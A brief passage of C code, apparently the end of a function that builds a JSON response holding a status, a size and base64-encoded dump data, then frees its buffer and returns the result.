             "{\"status\":\"ok\",\"size\":%zu,\"data\":\"%s\"}",
             dump_size, b64);
    free(b64);
    return out;
}
